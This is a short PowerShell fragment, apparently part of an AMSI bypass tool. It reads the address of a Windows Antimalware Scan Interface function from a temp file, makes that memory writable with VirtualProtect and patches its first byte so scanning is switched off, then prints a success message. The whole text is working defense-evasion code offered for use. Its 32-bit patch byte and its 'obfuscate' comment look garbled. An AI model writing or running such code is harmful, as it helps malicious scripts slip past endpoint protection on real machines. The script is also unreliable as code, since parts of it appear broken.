# Retrieve AMSI Function Address
$FuncAddr = Get-Content "$env:TEMP\amsi_func.txt" -Encoding ASCII | ForEach-Object {[IntPtr]$_}

# Obfuscate the Patch
$PatchValue = if ([IntPtr]::Size -eq 8) {
    [byte]0xC3 # 64-bit architecture
} else {
    [byte]0x33 # 32-bit architecture
}

# Modify AMSI Function
[void][AMSIB]::VirtualProtect($FuncAddr, [UIntPtr]1, 0x40, [ref]0)
[System.Runtime.InteropServices.Marshal]::WriteByte($FuncAddr, $PatchValue)

Write-Host "[*] AMSI bypass successfully applied."
